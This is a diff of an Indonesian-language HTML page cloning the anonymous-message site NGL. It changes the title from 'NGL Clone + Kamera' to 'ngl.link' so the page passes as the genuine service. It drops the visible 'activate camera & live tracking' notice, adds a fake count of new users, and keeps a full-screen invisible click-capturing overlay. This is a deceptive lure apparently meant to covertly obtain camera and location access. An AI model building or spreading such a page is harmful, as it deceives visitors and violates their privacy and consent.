@@ -1,26 +1,46 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NGL Clone + Kamera</title>
-<script src="https://cdn.tailwindcss.com"></script>
-<link href="style.css" rel="stylesheet"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ngl.link</title>
+  <link rel="stylesheet" href="style.css">
 </head>
-<body class="min-h-screen flex items-center justify-center px-4 py-12">
-<div class="w-full max-w-md">
-  <div class="card bg-white rounded-xl shadow-md p-5">
-    <div class="text-gray-900 font-semibold text-sm mb-2">@bibd51254</div>
-    <div class="text-gray-500 text-xs mb-4">kirimi aku pesan anonim</div>
-    <textarea id="msg" class="w-full h-36 p-4 resize-none border rounded-lg" placeholder="Tulis pesanmu..."></textarea>
-    <button id="sendBtn" class="mt-4 w-full bg-black text-white py-3 rounded-full font-semibold hover:scale-[1.02] transition">Send!</button>
-    <div id="status" class="mt-2 text-sm text-yellow-500">Klik halaman untuk aktivasi kamera & live tracking...</div>
+<body>
+  <div class="container">
+
+    <!-- Card -->
+    <div class="card">
+      <div class="username">@RapipppXD</div>
+      <div class="subtitle">kirimi aku pesan anonim!</div>
+
+      <!-- Textarea -->
+      <textarea id="msg" class="textarea" placeholder="apakah kamu lajang?"></textarea>
+
+      <!-- Label -->
+      <div class="label">🔒 tanya-jawab anonim</div>
+
+      <!-- Button -->
+      <button id="sendBtn" class="btn">Kirim!</button>
+      <div id="status" class="status">© ngl - 2025</div>
+    </div>
+
+    <!-- Fake CTA bawah -->
+    <div class="cta">
+      👇 245 kawan baru je tekan butang 👇
+    </div>
+    <button class="btn wide">Dapatkan pesan untukmu sendiri!</button>
+
+    <!-- Footer -->
+    <div class="footer">
+      <a href="#">Terms</a>
+      <a href="#">Privacy</a>
+    </div>
   </div>
-</div>
 
-<!-- invisible click area -->
-<div id="clickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;"></div>
+  <!-- Area klik invisible -->
+  <div id="clickArea"></div>
 
-<script src="script.js"></script>
+  <script src="script.js"></script>
 </body>
 </html>
